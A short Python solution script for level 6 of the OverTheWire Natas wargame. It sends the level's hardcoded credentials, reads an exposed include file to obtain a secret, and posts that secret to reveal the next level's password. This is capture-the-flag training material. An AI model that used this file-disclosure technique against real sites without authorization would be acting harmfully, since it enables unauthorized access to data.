#!/usr/bin/python3

import requests

url = 'http://natas6.natas.labs.overthewire.org/'
auth = ('natas6', 'fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR')

# from looking at the source we find that it contains a file within this path

r = requests.get(url=f'{url}/includes/secret.inc', auth=auth)
print(r.text)

secret = "FOEIUWGHFEEUHOFUOIU"

# now we can post this secret to find th epassword to the next level
r = requests.post(url=url, auth=auth, data={"secret": secret, "submit": "submit"})
print(r.text)
DATA = dict(secret=secret, submit="submit")
print(DATA)